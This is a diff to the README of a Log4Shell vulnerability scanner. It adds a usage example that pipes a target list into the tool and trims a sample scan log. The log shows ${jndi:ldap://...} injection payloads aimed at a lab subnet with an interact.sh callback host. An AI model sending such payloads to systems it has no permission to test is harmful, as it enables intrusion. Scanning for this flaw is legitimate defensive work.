@@ -242,6 +242,7 @@ Usage:
 Examples:
 - Scan a url: scan4log4shell remote url https://target.org
 - Scan multiple urls: scan4log4shell remote url https://target1.org https://target2.org
+- Scan multiple urls: cat targets.txt | scan4log4shell remote url
 - TCP catcher: scan4log4shell remote url https://target.org --catcher-type tcp --caddr 172.20.0.30:4444
 - Custom headers file: scan4log4shell remote url https://target.org --headers-file ./headers.txt
 - Scan url behind basic auth: scan4log4shell remote url https://target.org --basic-auth user:pass
@@ -290,7 +291,6 @@ make run-remote
 scanner_1  | [i] Log4Shell Remote Vulnerability Scan
 scanner_1  | [i] Listening on c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh
 scanner_1  | [i] Start scanning CIDR 172.20.0.0/24
-scanner_1  | ---------
 scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.0:8080 [GET]
 scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.1:8080 [GET]
 scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.2:8080 [GET]
